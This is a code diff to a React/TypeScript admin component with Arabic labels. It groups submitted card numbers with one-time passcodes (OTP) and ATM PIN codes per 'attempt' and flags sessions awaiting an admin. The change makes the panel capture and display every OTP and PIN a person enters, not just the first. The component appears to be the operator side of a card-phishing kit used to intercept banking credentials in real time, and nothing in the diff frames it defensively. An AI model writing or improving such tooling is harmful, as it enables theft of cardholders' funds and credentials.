@@ -51,8 +51,8 @@ interface AttemptBlock {
   attemptNumber: number;
   startTime: string;
   card?: SubmissionRow;
-  otp?: SubmissionRow;
-  atm?: SubmissionRow;
+  otps: SubmissionRow[];  // Array of all OTP submissions (otp1, otp2, otp3, etc.)
+  atms: SubmissionRow[];  // Array of all ATM submissions
   isActive: boolean;
   waitingForAdmin?: boolean;
 }
@@ -182,22 +182,17 @@ function groupIntoAttemptBlocks(rows: SubmissionRow[]): AttemptBlock[] {
         attemptNumber: blocks.length + 1,
         startTime: row.createdAt,
         card: row,
+        otps: [],      // Initialize empty array for OTPs
+        atms: [],     // Initialize empty array for ATMs
         isActive: false,
       };
       blocks.push(newBlock);
     } else if (row.type === "otp" && blocks.length > 0) {
-      // OTP goes to the LATEST block (the card that came before it)
-      // Only if this block doesn't already have an OTP
-      const latestBlock = blocks[blocks.length - 1];
-      if (!latestBlock.otp) {
-        latestBlock.otp = row;
-      }
+      // Push ALL OTPs to the latest block (otp1, otp2, otp3, etc.)
+      blocks[blocks.length - 1].otps.push(row);
     } else if (row.type === "atm" && blocks.length > 0) {
-      // ATM goes to the LATEST block
-      const latestBlock = blocks[blocks.length - 1];
-      if (!latestBlock.atm) {
-        latestBlock.atm = row;
-      }
+      // Push ALL ATMs to the latest block
+      blocks[blocks.length - 1].atms.push(row);
     }
   }
 
@@ -289,8 +284,6 @@ function AttemptBlockCard({
   sessionId: string;
 }) {
   const cardData = block.card ? parseData(block.card.data) : null;
-  const otpData = block.otp ? parseData(block.otp.data) : null;
-  const atmData = block.atm ? parseData(block.atm.data) : null;
 
   const formattedCard = cardData?.cardNumber
     ? cardData.cardNumber.replace(/(.{4})/g, "$1 ").trim()
@@ -347,24 +340,38 @@ function AttemptBlockCard({
         </div>
       )}
 
-      {/* OTP or ATM Data */}
-      {block.otp ? (
-        <div className="rounded-2xl border border-green-200 bg-green-50 p-3 mb-3">
-          <div className="flex items-center justify-between mb-2">
-            <span className="text-xs font-semibold text-green-700">رمز OTP</span>
-            <KeyRound className="w-4 h-4 text-green-500" />
-          </div>
-          <p className="text-2xl font-bold font-mono text-green-800" dir="ltr">{otpData?.otpCode ?? "—"}</p>
-          <span className="text-xs text-green-600 mt-1 block">{formatAgo(block.otp.createdAt)}</span>
+      {/* OTP Codes - Render ALL OTPs in sequence */}
+      {block.otps.length > 0 ? (
+        <div className="space-y-2 mb-3">
+          {block.otps.map((otpRow, index) => {
+            const otpItemData = parseData(otpRow.data);
+            return (
+              <div key={otpRow.id} className="rounded-2xl border border-green-200 bg-green-50 p-3">
+                <div className="flex items-center justify-between mb-2">
+                  <span className="text-xs font-semibold text-green-700">رمز OTP {index + 1}</span>
+                  <KeyRound className="w-4 h-4 text-green-500" />
+                </div>
+                <p className="text-2xl font-bold font-mono text-green-800" dir="ltr">{otpItemData?.otpCode ?? "—"}</p>
+                <span className="text-xs text-green-600 mt-1 block">{formatAgo(otpRow.createdAt)}</span>
+              </div>
+            );
+          })}
         </div>
-      ) : block.atm ? (
-        <div className="rounded-2xl border border-blue-200 bg-blue-50 p-3 mb-3">
-          <div className="flex items-center justify-between mb-2">
-            <span className="text-xs font-semibold text-blue-700">رمز ATM</span>
-            <Banknote className="w-4 h-4 text-blue-500" />
-          </div>
-          <p className="text-xl font-bold font-mono text-blue-800" dir="ltr">{atmData?.atmCode ?? "—"}</p>
-          <span className="text-xs text-blue-600 mt-1 block">{formatAgo(block.atm.createdAt)}</span>
+      ) : block.atms.length > 0 ? (
+        <div className="space-y-2 mb-3">
+          {block.atms.map((atmRow, index) => {
+            const atmItemData = parseData(atmRow.data);
+            return (
+              <div key={atmRow.id} className="rounded-2xl border border-blue-200 bg-blue-50 p-3">
+                <div className="flex items-center justify-between mb-2">
+                  <span className="text-xs font-semibold text-blue-700">رمز ATM {index + 1}</span>
+                  <Banknote className="w-4 h-4 text-blue-500" />
+                </div>
+                <p className="text-xl font-bold font-mono text-blue-800" dir="ltr">{atmItemData?.atmCode ?? "—"}</p>
+                <span className="text-xs text-blue-600 mt-1 block">{formatAgo(atmRow.createdAt)}</span>
+              </div>
+            );
+          })}
         </div>
       ) : isLatest && block.card ? (
         // Smart visibility: Only show placeholder when user is on an OTP page
